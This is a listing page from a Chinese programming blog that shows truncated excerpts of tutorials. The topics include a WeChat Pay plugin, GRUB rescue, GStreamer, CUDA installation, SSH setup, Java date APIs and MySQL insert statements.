因为往往你的插件入口，也就是前端AngularJS调用插件方法是通过PayPlugin.java调用的，微信的官网中有这么一句话：
所以必须要有这么一个类，但是打开官网Demo中的这个类，我们看看都写了什么：
public class WXPayEntryActivity extends Activity implements IWXAPIEventHandler @Override public void onCreate(Bundle savedInstanceState) @Override protected void onNewIntent(Intent intent) @Override public void onReq(BaseReq req) @Override public void onResp(BaseResp resp) 这是一个原生的Activity类，没有配套支持的话，这就是一个门，进去了就出不来了，所以作为插件的形式，我们应该能让Activity和PayPlugin能够通信，这样由我们自己的Controller.js调用PayPlugin的方法然后调起微信支付，支付后，微信支持的Activity类得到了回调信息才能再传出来给回PayPlugin，PayPlugin再给回Controller.js然后展示到前端。 （我自己写的Controller.js:
$scope.pay=function(){ if ($scope.selectPay === 'alipay') { //aliPay handler } else if ($scope.selectPay === 'weixin') { URLUtils.weixinPayInfo($stateParams.orderNo).then(function(res){ if(res &amp;&amp; res.entity){ window.plugins.PayPlugin.weixin(res.entity, function(res){ $state.go('app.assess',{orderNo:$stateParams.orderNo},{location: "replace", reload: true}); }, function(res){ //handle error message }); } }); } else { alert("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1ff4cb0a840a4c3aa2a4ea7c1b493d92/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d46c4b9766aa499f4df3c06fd17b1a2e/" rel="bookmark">
			刚刚装了ubuntu，遇到error：file /boot/grub/i386-pc /normal.mod not found
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		首先在grub rescue&gt;输入ls 看看你的分区
之后得看你的在装系统进行分区的时候有没有把/boot独立分出来：
情景一：分区时/boot没分出来
输入:(*------这是注释，msdosX中的X表示分区标号，可以由ls看出，X依次尝试更换--------*)
set root=（hd0,msdosX）
set prefix=(hd0,msdosX)/boot/grub
insmod normal
结果一：如果这个分区没有这个文件，则会出现提示找不到文件，再次更换X重新输入
结果二：如果有，则什么都没提示，直接可以输入下一条命令
输入:normal
出现grub界面，我们可以选择进入什么系统
情景二：分区时/boot被分出来，这表示/boot占一个分区,则命令有所改变
输入：
set root=（hd0,msdosX）
set prefix=(hd0,msdosX)/grub *------------这是注释，因为分区表示/boot，所以/grub前去掉/boot-----------*
insmod normal
结果一：如果这个分区没有这个文件，则会出现提示找不到文件，再次更换X重新输入
结果二：如果有，则什么都没提示，直接可以输入下一条命令
输入:normal
按以上做的就可以进入系统，但是，只是这一次，你必须得设置一下grub
进入系统后在shell中输入：
sudo update-grub
sudo grub-install /dev/sda
这样以后才能每次进入grub界面，不再重新输入上面的命令来进入grub
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/eaecd06dc90d19e7834a71e2b107ea89/" rel="bookmark">
			gstreamer插件简介（1）--gstreamer框架
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 1. 简介 GStreamer是一个开源的 多媒体框架库。利用它，可以构建一系列的媒体处理模块，包括从简单的ogg播放功能到复杂的音频（混音）和视频（ 非线性编辑）的处理。 应用程序可以透明的利用 解码和 过滤技术。开发者可以使用简洁通用的接口来编写一个简单的 插件来添加新的解码器或 滤镜。目前，gstreamer已经可以应用在Linux、windows、macos、android、unix等多个平台上了，而且有全世界的开源工程师们在使用和维护。基于gstreamer的易用性，gstreamer得到了极大的推广。 2. 本文主讲内容 本文主要讲述目前应用在常用的linux桌面系统上的gstreamer插件，gstreamer目前在桌面系统上提供0.10和1.0两个版本，本文讲解0.10版本和1.0。 其中，0.10版本插件有以下几个： 1） gstreamer-0.10，这个是基本框架，目前系统中都提供了gstreamer-1.0，而且0.10版本目前已经不再更新维护了，但是稳定可靠，包含pipeline、bin等最基础的pipeline。 2） gstreamer-plugins-base-0.10，这个是基础插件库，包含用于编写元素的辅助库、基类、视频和音频解码器、编码器和过滤器，例如enc、mux和demux。 3） gstreamer-plugins-bad-0.10，主要提供了一些测试组件。 4） gstreamer-plugins-good-0.10，提供了常用组件，例如去隔行的deinterlace。 5） gstreamer-plugins-ugly-0.10，最牛的是提供的x264编解码器。 6） gstreamer-ffmpeg-0.10，基于ffmpeg提供的gstreamer支持库，非常的丰富，各种编解码器，混合器，最常用ffmpegcolorspace。 1.0版本插件跟0.10版本插件基本一致，但是内部框架已经大大不同。0.10版本的gstreamer插件目前已经不再更新了，所以以后重心需要转移到gstreamer1.0上。 3. gstreamer常用命令和组件 gstreamer提供几个最常用命令，gst-inspect、gst-launch 1） gst-inspect：gstreamer组件探测命令，由于gstreamer是注册形式的，当新安装了gstreamer插件后，可以使用gst-inspect命令来探测新加入的pipeline。gst-inspect后面加上pipeline组件名，可以查看该组件详细信息，例如：gst-inspect filesink 2） gst-launch：gstreamer管道建立命令，使用该命令可以组件若干个pipeline形成一条数据流，完成指定的工作。 gstreamer常用的几个pipeline 1） filesrc、filesink：文件组件，可以用于读取文件进行输入或输出。 2） videotestsrc、ximagesink：测试视频输入，视频显示。 3）appsrc、appsink：用于编程的app组件，可以通过app组件从外部取数据，或者导出数据给用户编辑。 。。。。 4. 用到gstreamer插件的嵌入式板卡 下面举例几个非常熟悉的平台。 1） imx6全系，都提供了gst-fsl-plugins插件，给gstreamer来使用，并且0.10版本和1.0版本都提供，但是根据本人测试，0.10版本存在很多bug，还是用1.0版本较好。 2） omap3xxx系列，提供gstreamer插件。 3） ti8168系列，提供gstreamer插件。 4） hantro g1，芯源编解码芯片，提供gstreamer插件，但是非官方的，本人维护一部分，国内下载不来。 5） interl、nvidia显卡，支持gstreamer加速。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/052db6c814a8e9737d06b90f06d30199/" rel="bookmark">
			第一章：1-10、试在下列条件下比较电路交换和分组交换。要传送的报文共x（bit），从源站到目的站共经过k段链路，每段链路的传播时延为d（s），数据率为C（bit/s）。在电路交换时电路的建立时间为s...
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		《计算机网络》谢希仁著第四版课后习题答案
答：对电路交换，当t=s时，链路建立；
当t=s+x/C，发送完最后一bit； 当t=s+x/C+kd，所有的信息到达目的地。 对分组交换，当t=x/C， 发送完最后一bit； 为到达目的地，最后一个分组需经过k-1个分组交换机的转发， 每次转发的时间为p/C， 所以总的延迟= x/C+(k-1)p/C+kd 所以当分组交换的时延小于电路交换 x/C+(k-1)p/C+kd＜s+x/C+kd时， (k-1)p/C
转载于:https://www.cnblogs.com/caochuangui/p/5804022.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/feb9e313eb8f9c3ac4b73f8658c90c5d/" rel="bookmark">
			Socket的基础编程（二）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.Socket实现多客户端用户登陆 对于多用户自然就需要用到多线程去处理了，因而需要在服务器端创建一个专门负责监听的应用主服务程序、一个专门负责响应的线程程序。 实现步骤： 1.创建服务器端线程类，run()方法中实现对一个请求的响应处理。 2.修改服务端的代码，实现一直监听状态。 3.服务器端每监听到一个请求，创建一个线程对象，启动。 2.服务端实现代码 public class LoginThread extends Thread { Socket socket = null; // 每启动一个线程，连接对应的Socket public LoginThread(Socket socket) { this.socket = socket; } @Override public void run() { super.run(); try { InputStream is = socket.getInputStream(); OutputStream os = socket.getOutputStream(); ObjectInputStream ois = new ObjectInputStream(is); UserBean user = (UserBean) ois.readObject(); if (user != null) { System.out.println("我是服务器，客户登录信息是：" + user.getName() + ",密码是：" + user.getPassword()); } String reply = "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/feb9e313eb8f9c3ac4b73f8658c90c5d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d4c8b65cd1b3f5b2460915afeea2f4ae/" rel="bookmark">
			Ubuntu16.04&#43;cuda8.0&#43;caffe安装教程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、安装nvidia驱动 首先去官网上查看适合你GPU的驱动（http://www.nvidia.com/Download/index.aspx?lang=en-us） 例如，本人的GPU适合的驱动如图： 执行如下语句，安装
sudo add-apt-repository ppa:graphics-drivers/ppa sudo apt-get update sudo apt-get install nvidia-367 sudo apt-get install mesa-common-dev sudo apt-get install freeglut3-dev 执行完上述后，重启（reboot）。 重启后输入：
nvidia-smi 如果出现了你的GPU列表，则说明驱动安装成功了。另外也可以通过
nvidia-settings 查看自己机器上详细的GPU信息，本人机器的信息如下： 2、安装CUDA cuda是nvidia的编程语言平台，想使用GPU就必须要使用cuda。 从这里下载cuda的安装文件 https://developer.nvidia.com/cuda-release-candidate-download 注意这里下载的是cuda8.0的runfile（local）文件。 这里是nvidia给出的官方安装指南（遇到问题时可以查阅）： http://docs.nvidia.com/cuda/cuda-installation-guide-linux/#axzz4HIBXnwyt 下载完cuda8.0后，执行如下语句，运行runfile文件：
sudo sh cuda_8.0.27_linux.run 执行后会有一系列提示让你确认，但是注意，有个让你选择是否安装nvidia361驱动时，一定要选择否，因为前面我们已经安装了更加新的nvidia367，所以这里不要选择安装。其余的都直接默认或者选择是即可。 安装成功后会出现如下界面：
=========== = Summary = =========== Driver: Not Selected Toolkit: Installed in /usr/local/cuda-8.0 Samples: Installed in /home/textminer Please make sure that – PATH includes /usr/local/cuda-8.0/bin – LD_LIBRARY_PATH includes /usr/local/cuda-8.0/lib64, or, add /usr/local/cuda-8.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d4c8b65cd1b3f5b2460915afeea2f4ae/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d145e3a39007a59420b0cdd1fdac11be/" rel="bookmark">
			巧妙解决Unable to delete directory: 盘符\项目名称\app\build\output\apk
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		背景：昨天和今天我都遇到过这个问题，非常顽固，当时解决的办法是重新建立一个工程然后再把原来的项目重新拷贝进入然后就解决了，可以是新的工程居然又出这个问题，这不是磨人的小妖精嘛。据我分析，在模拟器突然塴掉或者运行模拟器出现错误的时候会出现这样的错误。
解决方法：
主要是打印的日志是：Error:Execution failed for task ':app:clean'.&gt; Unable to delete directory: 盘符\项目名称\app\build\outputs\apk
我找到了简单的解决方法，就是首先关机重启，然后重启动之后再在（盘符\项目名称\app\build\outputs\apk）目录下面把那个app-debug.apk文件夹里面所有的apk都删除，如果不关机重启是删除不掉的。然后呢再运行一下项目你就会奇迹的发现，项目又好了。
这样避免了出这个问题总是要去重新集成项目，要是项目大，这可就坑爹了。
如果我的方法不好使，请再参考一下下面这个方法。
其他人的解决方法:
在http://stackoverflow.com/questions/32914499/error-execution-failed-for-task-appclean-unable-to-delete-file 上有人遇到过这个问题，上面帖子提到的LockHunter发现是金山毒霸在后台占用！卸载了就可以！
他建议，将金山毒霸卸载后，重新Rebuild project后 输出BUILD SUCCESSFUL。
纪实：2016-8-24
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0687ca24803b0935f382a9eb18ee5566/" rel="bookmark">
			【算法导论-35】图算法JGraphT开源库介绍
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Wiki 《算法导论》从22章开始图算法。但是Java JDK中没有Graph相关的库，自己实现的话可维护性较差。 JGraphT是一个开源的图理论数据结构和算法的开源库。可以在学习《算法导论》的同时学习该库，同时可以基于该库实现《算法导论》中相关图算法。
相关资料 JGraphT主页 JGraphT 源码GitHub主页 JGraphT jar包GitHub主页 JGraphT实现细节
简单实例 将“JGraphT jar包GitHub主页”的lib文件夹下的jgrapht-core-0.9.2.jar包添加项目工程中。 第一个实例时官方提供的简单有向图和无向图的例子。
import java.net.*; import org.jgrapht.*; import org.jgrapht.graph.*; /** * A simple introduction to using JGraphT. * * @author Barak Naveh * @since Jul 27, 2003 */ public final class HelloJGraphT { private HelloJGraphT() { } // ensure non-instantiability. /** * The starting point for the demo. * * @param args ignored. */ public static void main(String [] args) { UndirectedGraph&lt;String, DefaultEdge&gt; stringGraph = createStringGraph(); // note undirected edges are printed as: {&lt;v1&gt;,&lt;v2&gt;} System.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0687ca24803b0935f382a9eb18ee5566/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/47cb258c52106b3f534a776d815bf973/" rel="bookmark">
			java获取指定日期前一天和后一天的日期
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		java获得指定日期的前一天，后一天的代码，需要的朋友可以参考下。 复制代码 代码如下:
/** * 获得指定日期的前一天 *
@param specifiedDay * @return * @throws Exception */
public static String getSpecifiedDayBefore(String specifiedDay){ SimpleDateFormat simpleDateFormat = new SimpleDateFormat("yyyy-MM-dd"); Calendar c = Calendar.getInstance(); Date date=null; try { date = new SimpleDateFormat("yy-MM-dd").parse(specifiedDay);
} catch (ParseException e) {
e.printStackTrace(); }
c.setTime(date); int day=c.get(Calendar.DATE); c.set(Calendar.DATE,day-1); String dayBefore=new SimpleDateFormat("yyyy-MM-dd").format(c.getTime()); return dayBefore; } /** * 获得指定日期的后一天
* @param specifiedDay * @return */ public static String getSpecifiedDayAfter(String specifiedDay){
Calendar c = Calendar.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/47cb258c52106b3f534a776d815bf973/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/10ed3f0cc163ca51d5bd4df99009e9fe/" rel="bookmark">
			ASPPBNET-pb快速开发bs应用框架用户手册
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目 录 1 ASPPB.NET介绍 5 2 适用范围 5 3 资源和工具 6 4 配置环境清单 6 5 ASPPB.NET应用框架服务器搭建(配置篇) 6 5.1 ASPPB.NET环境配置 6 5.1.1 必备程序 6 5.1.2 IIS安装配置 7 5.1.2.1 IIS服务安装 7 5.1.2.2 IIS服务选择默认的ASP.NET版本(仅仅适用IIS5和6) 7 5.1.2.3 部署IIS7及以上版本的系统Windows 7或Windows2008 8 5.1.3 AspPb.Net Demo程序部署到IIS上 8 5.1.4 AspPb.Net 打包发布程序介绍 8 6 ASPPB.NET功能介绍及类库介绍 9 6.1 ASPPBNETLIB.PBD类库介绍 9 6.1.1 PbniTransction 对象介绍 10 6.1.2 PbniHashTable 对象介绍 10 6.1.3 PbniDwimplHelp 对象介绍 11 6.1.3.1 设置要查询的数据窗口对象到DwHelp服务对象 11 6.1.3.2 对数据窗口执行查询 11 6.1.3.3 更新数据窗口 11 6.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/10ed3f0cc163ca51d5bd4df99009e9fe/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9c8095e1f738a5e138b576eb3805fe94/" rel="bookmark">
			java 8 LocalDateTime 20 例
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		http://www.importnew.com/15637.html
伴随lambda表达式、streams以及一系列小优化，Java 8 推出了全新的日期时间API，在教程中我们将通过一些简单的实例来学习如何使用新API。Java处理日期、日历和时间的方式一直为社区所诟病，将 java.util.Date设定为可变类型，以及SimpleDateFormat的非线程安全使其应用非常受限。Java也意识到需要一个更好的 API来满足社区中已经习惯了使用JodaTime API的人们。全新API的众多好处之一就是，明确了日期时间概念，例如：瞬时（instant）、 长短（duration）、日期、时间、时区和周期。同时继承了Joda库按人类语言和计算机各自解析的时间处理方式。不同于老版本，新API基于ISO标准日历系统，java.time包下的所有类都是不可变类型而且线程安全。下面是新版API中java.time包里的一些关键类：
Instant：瞬时实例。LocalDate：本地日期，不包含具体时间 例如：2014-01-14 可以用来记录生日、纪念日、加盟日等。LocalTime：本地时间，不包含日期。LocalDateTime：组合了日期和时间，但不包含时差和时区信息。ZonedDateTime：最完整的日期时间，包含时区和相对UTC或格林威治的时差。 新API还引入了ZoneOffSet和ZoneId类，使得解决时区问题更为简便。解析、格式化时间的DateTimeFormatter类也全部重新设 计。注意，这篇文章是我在一年前Java 8即将发布时写的，以下示例代码中的时间都是那一年的，当运行这些例子时会返回你当前的时间。
在Java 8中如何处理日期和时间 常有人问我学习一个新库的最好方式是什么？我的答案是在实际项目中使用它。项目中有很多真正的需求驱使开发者去发掘并学习新库。简单得说就是任务驱动学习探 索。这对Java 8新日期时间API也不例外。我创建了20个基于任务的实例来学习Java 8的新特性。从最简单创建当天的日期开始，然后创建时间及时区，接着模拟一个日期提醒应用中的任务——计算重要日期的到期天数，例如生日、纪念日、账单 日、保费到期日、信用卡过期日等。
示例 1、在Java 8中获取今天的日期 Java 8 中的 LocalDate 用于表示当天日期。和java.util.Date不同，它只有日期，不包含时间。当你仅需要表示日期时就用这个类。
1 2 LocalDate today = LocalDate.now(); System.out.println( "Today's Local date : " + today); 1 2 Output Today's Local date : 2014-01-14 上面的代码创建了当天的日期，不含时间信息。打印出的日期格式非常友好，不像老的Date类打印出一堆没有格式化的信息。
示例 2、在Java 8中获取年、月、日信息 LocalDate类提供了获取年、月、日的快捷方法，其实例还包含很多其它的日期属性。通过调用这些方法就可以很方便的得到需要的日期信息，不用像以前一样需要依赖java.util.Calendar类了。
1 2 3 4 5 LocalDate today = LocalDate.now(); int year = today.getYear(); int month = today.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9c8095e1f738a5e138b576eb3805fe94/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/668256ed47d8b7c1e0b1ea8b3507212e/" rel="bookmark">
			ssh用法及命令
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		http://blog.csdn.net/pipisorry/article/details/52269785
什么是SSH？ 简单说，SSH是一种网络协议，用于计算机之间的加密登录。如果一个用户从本地计算机，使用SSH协议登录另一台远程计算机，我们就可以认为，这种登录是安全的，即使被中途截获，密码也不会泄露。最早的时候，互联网通信都是明文通信，一旦被截获，内容就暴露无疑。1995年，芬兰学者Tatu Ylonen设计了SSH协议，将登录信息全部加密，成为互联网安全的一个基本解决方案，迅速在全世界获得推广，目前已经成为Linux系统的标准配置。
SSH只是一种协议，存在多种实现，既有商业实现，也有开源实现。本文针对的实现是OpenSSH，它是自由软件，应用非常广泛。这里只讨论SSH在Linux Shell中的用法。如果要在Windows系统中使用SSH，会用到另一种软件PuTTY，这需要另文介绍。
中间人攻击
SSH之所以能够保证安全，原因在于它采用了公钥加密。
整个过程是这样的：（1）远程主机收到用户的登录请求，把自己的公钥发给用户。（2）用户使用这个公钥，将登录密码加密后，发送回来。（3）远程主机用自己的私钥，解密登录密码，如果密码正确，就同意用户登录。
这个过程本身是安全的，但是实施的时候存在一个风险：如果有人截获了登录请求，然后冒充远程主机，将伪造的公钥发给用户，那么用户很难辨别真伪。因为不像https协议，SSH协议的公钥是没有证书中心（CA）公证的，也就是说，都是自己签发的。
可以设想，如果攻击者插在用户与远程主机之间（比如在公共的wifi区域），用伪造的公钥，获取用户的登录密码。再用这个密码登录远程主机，那么SSH的安全机制就荡然无存了。这种风险就是著名的"中间人攻击"（Man-in-the-middle attack）。
ssh的安装 SSH分客户端openssh-client和openssh-server
如果你只是想登陆别的机器的SSH只需要安装openssh-client（ubuntu有默认安装，如果没有则sudoapt-get install openssh-client），如果要使本机开放SSH服务就需要安装openssh-server。
Ubuntu/win10(powershell)缺省已经安装了ssh client。
#配置ssh# echo -e "\033[31;1m ******************************* \033[0m"
echo -e "\033[31;1m ************安装和配置ssh************ \033[0m"
sudo apt-get install -y openssh-server 1&gt; /dev/null
sudo sed -i 's/UsePAM no/UsePAM yes/g' /etc/ssh/sshd_config
sudo sed -i '8a /etc/init.d/ssh start' /etc/profile
sudo /etc/init.d/ssh start
ps -e | grep ssh
echo -e "\033[31;1m ssh授权 \033[0m"
cd ~/.ssh/
ssh-keygen -t rsa
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/668256ed47d8b7c1e0b1ea8b3507212e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/683a21e8c27336686cb81cacc45816b7/" rel="bookmark">
			微博分享不成功 Failed to find provider info for com.sina.weibo.sdkProvider
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		三、历史尝试 添加build.gradle配置如下 /*微博分享不成功多加的代码*/ task nativeLibsToJar(type: Zip, description: "create a jar archive of the native libs") { destinationDir file("$projectDir/libs") baseName "Native_Libs2" extension "jar" from fileTree(dir: "libs", include: "**/*.so") into "lib" } tasks.withType(JavaCompile) { compileTask -&gt; compileTask.dependsOn(nativeLibsToJar) } 把so库打包成jar文件 问题:程序toast报错21338
解决办法:如果报21338就说明你的Constants.java里的appkey和你申请时的APPKEY不一致,更换成相同的appkey之后问题解决,其他错误代码可以去微博开放平台找相应的问题,发现此处错误也是因为我自己疏忽大意造成,希望大家不要犯此类错误
问题程序toast报错21322
解决办法:此错误是由于回调页与自己填写时的回调页不匹配导致,
查看回调也信息方法:
登陆微博开放平台-&gt;点击我的应用-&gt;右侧列表选择应用信息-&gt;点击高级信息 ,即可查看自己定义的回调页内容,若未定义请定义为与程序中填写的回调页内容一致
其他错误代码详情请到微博开放平台wiki里查,地址如下
http://open.weibo.com/wiki/Help/error
问题:程序toast报错21338
解决办法:如果报21338就说明你的Constants.java里的appkey和你申请时的APPKEY不一致,更换成相同的appkey之后问题解决,其他错误代码可以去微博开放平台找相应的问题,发现此处错误也是因为我自己疏忽大意造成,希望大家不要犯此类错误
问题程序toast报错21322
解决办法:此错误是由于回调页与自己填写时的回调页不匹配导致,
查看回调也信息方法:
登陆微博开放平台-&gt;点击我的应用-&gt;右侧列表选择应用信息-&gt;点击高级信息 ,即可查看自己定义的回调页内容,若未定义请定义为与程序中填写的回调页内容一致
其他错误代码详情请到微博开放平台wiki里查,地址如下
http://open.weibo.com/wiki/Help/error
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8b73703920e5d6786d81a6a370b36367/" rel="bookmark">
			python 第三方模块 转 https://github.com/masterpy/zwpy_lst
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Chardet，字符编码探测器，可以自动检测文本、网页、xml的编码。
colorama，主要用来给文本添加各种颜色，并且非常简单易用。
Prettytable，主要用于在终端或浏览器端构建格式化的输出。
difflib，Python标准库，计算文本差异
Levenshtein，快速计算字符串相似度。
fuzzywuzzy,字符串模糊匹配。
esmre,正则表达式的加速器。
shortuuid,一组简洁URL/UUID函数库。
ftfy，Unicode文本工具
unidecode，ascii和Unicode文本转换函数。
xpinyin，将汉字转换为拼音的函数库
pangu.py，调整对中日韩文字当中的字母、数字间距。
pyfiglet，Python写的figlet程序，使用字符组成ASCII艺术图片
uniout，提取字符串中可读写的字符
awesome slugify，一个Python slugify库，用于处理Unicode。
python-slugify，转换Unicode为ASCII内码的slugify函数库。
unicode-slugify，生成unicode内码，Django的依赖包。
ply，Python版的lex和yacc的解析工具
phonenumbers，解析电话号码，格式，存储和验证的国际电话号码。
python-user-agents，浏览器的用户代理（user-agents）的解析器。
sqlparse，SQL解析器。
pygments，一个通用的语法高亮工具。
python-nameparser，解析人名，分解为单独的成分。
pyparsing，通用解析器生成框架。
tablib，表格数据格式，包括，XLS、CSV，JSON，YAML。
python-docx，docx文档读取，查询和修改，微软Word 2007 / 2008的docx文件。
xlwt/xlrd，读写Excel格式的数据文件。
xlsxwriter，创建Excel格式的xlsx文件。
xlwings，利用Python调用Excel
csvkit，CSV文件工具包。
marmir，把Python数据结构，转化为电子表格。
pdfminer，从PDF文件中提取信息。
pypdf2， 合并和转换PDF页面的函数库。
Python-Markdown，轻量级标记语言Markdown的Python实现。
Mistune，,快速、全功能的纯Python编写的Markdown解释器。
dateutil，标准的Python官方datetime模块的扩展包，字符串日期工具，其中parser是根据字符串解析成datetime，而rrule是则是根据定义的规则来生成datetime。
arrow,更好的日期和时间处理Python库
chronyk，一个Python 3版函数库，用于解析人写的时间和日期。
delorean，清理期时间的函数库。
when.py，为见的日期和时间，提供人性化的功能。
moment，类似Moment.js的日期/时间Python库
pytz，世界时区，使用tz database时区信息数据库
BeautifulSoup ，基于Python的HTML/XML解析器，简单易用, 功能很强大,即使是有bug，有问题的html代码，也可以解析
lxml，快速，易用、灵活的HTML和XML处理库，功能超强，在遇到有缺陷、不规范的xml时，Python自带的xml处理器可能无法解析。报错时，程序会尝试再用lxml的修复模式解析。
htmlparser，官方版解析HTML DOM树，偶尔搞搞命令行自动表单提交用得上。
pyyaml，Python版本的YAML解释器。
html5lib，-标准库，解析和序列化HTML文档和片段。
pyquery，类似jQuery的的HTML解释器函数库。
cssutils，Python CSS库。
MarkupSafe，XML或HTML / XHTML安全字符串标记工具。
cssutils - A CSS library for Python.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8b73703920e5d6786d81a6a370b36367/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8406697b7b97993809956679905aab7e/" rel="bookmark">
			Read Time out Exception 解决办法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在http请求时，报Read Time Out Exception异常
原因是：网络超时
解决办法：
在创建httpClient实例时
RequestConfig.Builder config_builder = RequestConfig.custom();
config_builder.setSocketTimeout(30000);//设置网络超时的时间
config_builder.setConnectTimeout(30000);//设置网络连接的时间
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/20831c71772f3abab293fdf3e7ff1d1d/" rel="bookmark">
			【基础】DML，不包含select语句
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 Github：https://github.com/yihonglei/road-of-arch/tree/master/thinking-in-mysql
一 DML(Data Manipulation Language)语句 数据操作语句，用于处理增删改查数据库记录，常用关键字insert，delete，update，select等等。
主要是对数据库记录进行增，删，改，查的操作，开发的时候用得比较多，特别是查询语句，
以下对增删改做些简单的介绍，对于查询语句知识比较多，下篇单独分析。
准备工作：
先建一个t_user_main表，只是用于测试增删改。
create table t_user_main ( f_userId int(10) NOT NULL AUTO_INCREMENT COMMENT '用户id,作为主键', f_userName varchar(50) COMMENT '用户名', f_age int(3) COMMENT '年龄', PRIMARY KEY (f_userId) ) ; 通过show create table tablename \G;查看详情与上面手动建表sql有些区别，数据库给加上了默认的引擎，字符集，默认空等等。
1、插入记录 插入语法：
INSERT INTO tablename(field1,field2,......,fieldn) VALUES(value1,value2,......valuen);
当我们去掉tablename后的(field1,field2,......,fieldn)，表示默认为表的所有列。
指定列名插入：
insert into t_user_main(f_userId,f_userName,f_age)values(1,'one',25);
不指定列名插入：
insert into t_user_main values(2,'two',26);
含有可空字段，非空含有默认值，自增涨字段可以不用出现在insert中，不写就按默认值处理。
比如，f_userId是自增长得，就可以不在insert中出现，交给数据库自增长存值。
一次性插入多条：
INSERT INTO tablename(field1,field2,......fieldn)
VALUES
(record1_value1,record1_value2,......record1_valuen),
.......
(recoredn_value1,reocordn_value2,......recordn_valuen);
这样插入性能高。
sql举例：
insert into t_user_main(f_userName,f_age) values('four',28),('five',29),('six',30),('seven',31);
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/20831c71772f3abab293fdf3e7ff1d1d/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/461/">«</a>
	<span class="pagination__item pagination__item--current">462/489</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/463/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 菜鸟程序员博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>